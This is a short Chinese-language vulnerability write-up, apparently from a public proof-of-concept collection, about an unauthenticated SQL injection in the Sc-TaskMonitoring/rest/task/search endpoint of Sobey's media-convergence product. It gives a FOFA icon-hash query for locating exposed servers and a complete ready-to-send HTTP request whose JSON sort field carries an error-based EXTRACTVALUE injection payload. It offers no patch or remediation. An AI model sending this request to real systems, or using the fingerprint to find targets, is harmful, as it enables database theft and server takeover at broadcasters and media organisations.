# 索贝融媒体search存在SQL注入漏洞

索贝融媒体产品是成都索贝数码科技股份有限公司（简称索贝）为各级电视台和媒体机构打造的一套集互联网和电视融合生产的解决方案。索贝融媒体 Sc-TaskMonitoring/rest/task/search 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
icon_hash="689611853"
```

## poc

```javascript
POST /Sc-TaskMonitoring/rest/task/search HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/json
Cookie: token=5ab95532238da1b7d9eb20de7ecef90e; siteCode=S1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"page":1,"search":{"assignedCodes":""},"size":10,"date":{},"sort":{"field":"1 AND EXTRACTVALUE(8342,CONCAT(0x7e,0x7171787171,(SELECT (ELT(8342=8342,1))),0x716b706b71,0x7e))","desc":true}}
```

![image-20241122150816351](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411221508580.png)